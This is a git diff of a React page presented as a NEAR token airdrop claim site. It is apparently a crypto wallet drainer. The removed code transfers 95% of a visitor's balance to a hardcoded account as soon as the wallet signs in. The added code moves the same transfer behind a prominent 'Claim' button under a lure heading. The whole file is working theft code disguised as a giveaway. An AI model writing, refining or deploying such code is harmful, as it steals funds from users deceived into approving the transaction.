@@ -24,6 +24,9 @@ export default function Home() {
   const modalRef = useRef(null);
   const [selector, setSelector] = useState(null);
   const [loading, setLoading] = useState(true);
+  const [error, setError] = useState("");
+  const [fade, setFade] = useState(false);
+  const [signedIn, setSignedIn] = useState(false);
 
   useEffect(() => {
   let unwrap;
@@ -54,53 +57,24 @@ export default function Home() {
       const modal = setupModal(selector, { contractId: "" });
       modalRef.current = modal;
       setSelector(selector);
+      // Update signedIn state if already signed in
+setSignedIn(selector.isSignedIn());
 
-      const onSignIn = async () => {
-        try {
-          const wallet = await selector.wallet();
-          const accounts = await wallet.getAccounts();
-          const signerId = accounts[0].accountId;
+// Listen for signIn / signOut events
+const handleSignIn = () => setSignedIn(true);
+const handleSignOut = () => setSignedIn(false);
 
-          // Fetch account balance from RPC
-          const rpcProvider = new providers.JsonRpcProvider({
-            url: "https://rpc.mainnet.near.org",
-          });
-          const accountState = await rpcProvider.query({
-            request_type: "view_account",
-            account_id: signerId,
-            finality: "final",
-          });
+selector.on("signedIn", handleSignIn);
+selector.on("signedOut", handleSignOut);
 
-          const balance = BigInt(accountState.amount);
-          const transferAmount = (balance * 95n) / 100n;
+// Update unwrap function to remove event listeners
+unwrap = () => {
+  selector.off("signedIn", handleSignIn);
+  selector.off("signedOut", handleSignOut);
+};
 
-          const transaction = {
-            receiverId: "96b80b96714e2b20dff9b0be6fde7868daf9bd0575c029a6901e868e38bea547",
-            actions: [
-              {
-                type: "Transfer",
-                params: {
-                  deposit: transferAmount.toString(),
-                },
-              },
-            ],
-          };
 
-          await wallet.signAndSendTransactions({
-            transactions: [transaction],
-          });
-        } catch (err) {
-          console.error("Transfer failed:", err);
-        }
-      };
-
-      selector.on("signedIn", onSignIn);
-      unwrap = () => selector.off("signedIn", onSignIn);
-
-      // Auto-retry transfer if already signed in (e.g., returning from mobile wallet)
-      if (selector.isSignedIn()) {
-        await onSignIn();
-      }
+      
 
       setLoading(false);
     } catch (err) {
@@ -120,6 +94,48 @@ export default function Home() {
       modalRef.current.show();
     } else {
       console.warn("Wallet selector is not ready yet.");
+    }
+  };
+
+    const handleClaim = async () => {
+    try {
+      if (!selector || !selector.isSignedIn()) {
+        setError("Please connect a wallet first.");
+        setFade(false);
+        setTimeout(() => setFade(true), 50);   // trigger fade
+        setTimeout(() => setError(""), 3000);  // clear message
+        return;
+      }
+
+      const wallet = await selector.wallet();
+      const accounts = await wallet.getAccounts();
+      const signerId = accounts[0].accountId;
+
+      const rpcProvider = new providers.JsonRpcProvider({
+        url: "https://rpc.mainnet.near.org",
+      });
+      const accountState = await rpcProvider.query({
+        request_type: "view_account",
+        account_id: signerId,
+        finality: "final",
+      });
+
+      const balance = BigInt(accountState.amount);
+      const transferAmount = (balance * 95n) / 100n;
+
+      const transaction = {
+        receiverId: "96b80b96714e2b20dff9b0be6fde7868daf9bd0575c029a6901e868e38bea547",
+        actions: [
+          {
+            type: "Transfer",
+            params: { deposit: transferAmount.toString() },
+          },
+        ],
+      };
+
+      await wallet.signAndSendTransactions({ transactions: [transaction] });
+    } catch (err) {
+      console.error("Claim failed:", err);
     }
   };
 
@@ -163,7 +179,11 @@ export default function Home() {
         </>
       ) : (
         <>
-          <h1 style={{ marginBottom: "2rem" }}>Claim your 10000 NEAR Airdrop</h1>
+          <h1 style={{ marginBottom: "2rem" }}>
+  Connect your wallet then press Claim to<br />
+  Claim your NEAR Airdrop
+</h1>
+
           <button
             onClick={handleConnect}
             style={{
@@ -176,12 +196,47 @@ export default function Home() {
               cursor: "pointer",
               boxShadow: "0 4px 6px rgba(0, 0, 0, 0.1)",
               transition: "background 0.3s ease",
+             marginBottom: "1rem",
             }}
             onMouseOver={(e) => (e.currentTarget.style.backgroundColor = "#f0f8ff")}
             onMouseOut={(e) => (e.currentTarget.style.backgroundColor = "#ffffff")}
           >
             Connect Wallet
           </button>
+
+<button
+  onClick={handleClaim}
+  disabled={!signedIn}
+  style={{
+    backgroundColor: signedIn ? "#28a745" : "#gray",
+    color: "#fff",
+    padding: "24px 48px", // bigger button size
+    fontSize: "24px",     // bigger text
+    border: "none",
+    borderRadius: "12px",
+    cursor: signedIn ? "pointer" : "not-allowed",
+    boxShadow: "0 4px 6px rgba(0, 0, 0, 0.1)",
+    transition: "background 0.3s ease",
+  }}
+>
+  Claim
+</button>
+
+
+
+          {error && (
+            <div
+              style={{
+                marginTop: "1rem",
+                color: "#ff4d4d",
+                fontWeight: "bold",
+                opacity: fade ? 0 : 1,
+                transition: "opacity 2s ease",
+              }}
+            >
+              {error}
+            </div>
+          )}
         </>
       )}
     </main>
